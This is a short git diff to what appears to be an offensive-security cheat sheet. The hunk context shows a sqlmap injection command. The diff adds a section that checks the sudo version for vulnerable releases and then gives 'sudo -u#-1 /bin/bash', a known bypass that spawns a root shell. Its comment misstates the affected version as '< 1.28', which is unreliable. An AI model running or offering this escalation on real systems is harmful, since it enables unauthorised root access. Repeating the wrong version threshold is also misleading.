@@ -259,6 +259,16 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 
 ## Sudo
 
+### Sudo version
+```bash
+# Check the sudo version
+sudo --version
+sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+
+# If sudo version is < 1.28, try the following command
+sudo -u#-1 /bin/bash
+```
+> - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
 
 ## Systemctl
 
